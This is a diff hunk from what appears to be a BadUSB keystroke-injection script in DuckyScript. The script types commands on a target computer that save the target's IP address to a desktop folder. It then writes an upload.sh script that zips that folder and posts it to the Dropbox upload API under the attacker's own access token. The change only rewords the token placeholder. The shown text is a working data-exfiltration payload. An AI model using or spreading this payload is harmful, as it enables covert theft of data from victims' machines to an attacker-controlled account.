@@ -40,7 +40,7 @@ STRING  mkdir ~/Desktop/"Public I.P. Data" && echo "Your TARGETS IP address is: 
 DELAY 1000
 ENTER
 DELAY 500
-STRING  echo 'cd ~/Desktop/"Public I.P. Data" && zip -r backup.zip . && curl -X POST https://content.dropboxapi.com/2/files/upload -H "Authorization: Bearer API ACCESS TOKEN HERE" -H "Dropbox-API-Arg: {\"path\": \"/Backup/backup.zip\",\"mode\": \"add\",\"autorename\": true,\"mute\": false}" -H "Content-Type: application/octet-stream" --data-binary @backup.zip' > upload.sh
+STRING  echo 'cd ~/Desktop/"Public I.P. Data" && zip -r backup.zip . && curl -X POST https://content.dropboxapi.com/2/files/upload -H "Authorization: Bearer <Your API token Here>" -H "Dropbox-API-Arg: {\"path\": \"/Backup/backup.zip\",\"mode\": \"add\",\"autorename\": true,\"mute\": false}" -H "Content-Type: application/octet-stream" --data-binary @backup.zip' > upload.sh
 DELAY 2000
 ENTER
 DELAY 500
